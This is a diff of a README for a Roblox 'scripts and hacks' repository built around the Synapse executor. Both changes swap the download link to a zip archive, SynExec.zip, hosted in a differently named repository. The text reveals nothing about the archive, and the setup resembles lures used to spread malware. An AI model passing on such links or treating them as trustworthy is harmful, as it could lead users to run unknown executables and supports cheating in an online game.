@@ -2,7 +2,7 @@
 
 Welcome to the **Roblox-Synapse** repository! 🎮 Here you can find various scripts and hacks for Roblox using Synapse and Lua scripting language.
 
-# [Download](https://github.com/mailvilenelson/zizi/releases/download/Enjoy!/Synapse.zip)
+# [Download](https://github.com/mailvilenelson/zizi/releases/download/Enjoy!/SynExec.zip)
 
 ## Overview
 
@@ -21,7 +21,7 @@ Welcome to the **Roblox-Synapse** repository! 🎮 Here you can find various scr
 
 To install synapse x script, follow these simple steps:
 
-* [Download](https://github.com/mailvilenelson/zizi/releases/download/Enjoy!/Synapse.zip)
+* [Download](https://github.com/mailvilenelson/zizi/releases/download/Enjoy!/SynExec.zip)
 
 Extract the downloaded ZIP file to your desired location on your system.
 
